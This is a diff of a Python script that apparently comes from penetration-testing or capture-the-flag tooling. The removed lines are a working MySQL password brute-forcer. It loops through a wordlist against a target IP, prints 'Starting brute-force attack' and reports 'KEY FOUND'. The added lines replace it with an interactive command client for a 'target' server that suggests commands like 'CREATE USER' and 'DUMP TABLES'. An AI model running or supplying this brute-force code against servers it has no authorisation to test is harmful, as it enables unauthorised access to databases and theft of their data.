@@ -1,57 +1,62 @@
-import mysql.connector
 import argparse
-import sys
-from colorama import Fore, Style, init
+import mysql.connector
+from mysql.connector import errorcode
 
-# Initialize colorama
-init(autoreset=True)
-
-def attempt_login(target_ip, username, password):
-    """Attempts to log in to MySQL with the given credentials."""
+def connect_to_db(target_ip, username, password):
     try:
-        conn = mysql.connector.connect(
+        # Connect to the MySQL database
+        connection = mysql.connector.connect(
             host=target_ip,
             user=username,
-            password=password,
-            connect_timeout=3
+            password=password
         )
-        conn.close()
-        return True
-    except mysql.connector.Error:
-        return False
+        print(f"Successfully connected to {target_ip}")
+        return connection
+    except mysql.connector.Error as err:
+        if err.errno == errorcode.ER_ACCESS_DENIED_ERROR:
+            print("Something is wrong with the username or password.")
+        elif err.errno == errorcode.ER_BAD_DB_ERROR:
+            print("Database does not exist.")
+        else:
+            print(err)
+        return None
 
-def bruteforce_mysql(target_ip, username, password_file):
-    """Performs a brute-force attack on MySQL."""
+def execute_command(connection, command):
+    cursor = connection.cursor()
     try:
-        with open(password_file, "r", encoding="utf-8") as f:
-            passwords = [line.strip() for line in f]
-    except FileNotFoundError:
-        print(Fore.RED + "[!] Password file not found.")
-        sys.exit(1)
+        cursor.execute(command)
+        # If the command is a SELECT, dump the results
+        if command.strip().lower().startswith('select'):
+            result = cursor.fetchall()
+            for row in result:
+                print(row)
+        else:
+            connection.commit()
+            print(f"Command executed successfully: {command}")
+    except mysql.connector.Error as err:
+        print(f"Error executing command: {err}")
+    finally:
+        cursor.close()
 
-    print(Fore.CYAN + f"[*] Starting brute-force attack on MySQL at {target_ip}...")
-
-    for password in passwords:
-        print(Fore.YELLOW + f'Trying Passphrase: "{password}"')
-        if attempt_login(target_ip, username, password):
-            print(Fore.GREEN + f'KEY FOUND: [ "{password}" ]')
-            return
-
-    print(Fore.RED + "KEY NOT FOUND")
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="MySQL Bruteforcer")
-    parser.add_argument("-l", required=True, help="Username")
-    parser.add_argument("-P", required=True, help="Path to password list")
-    parser.add_argument("target", help="MySQL target IP (mysql://<target-ip>)")
-
+def main():
+    # Parse command line arguments
+    parser = argparse.ArgumentParser(description="MySQL Command Executor")
+    parser.add_argument('target_ip', type=str, help="Target IP address of the MySQL server")
+    parser.add_argument('-l', '--username', type=str, required=True, help="MySQL username")
+    parser.add_argument('-P', '--password', type=str, required=True, help="MySQL password")
     args = parser.parse_args()
 
-    # Extract IP from "mysql://<target-ip>"
-    if args.target.startswith("mysql://"):
-        target_ip = args.target.replace("mysql://", "")
-    else:
-        print(Fore.RED + "[!] Invalid target format. Use mysql://<target-ip>")
-        sys.exit(1)
+    # Connect to the MySQL server
+    connection = connect_to_db(args.target_ip, args.username, args.password)
+    if connection:
+        while True:
+            # Get user input for MySQL commands
+            user_command = input("Enter a MySQL command (e.g., 'CREATE USER' or 'DUMP TABLES') or type 'exit' to quit: ")
+            if user_command.lower() == 'exit':
+                break
+            execute_command(connection, user_command)
 
-    bruteforce_mysql(target_ip, args.l, args.P)
+        connection.close()
+
+if __name__ == "__main__":
+    main()
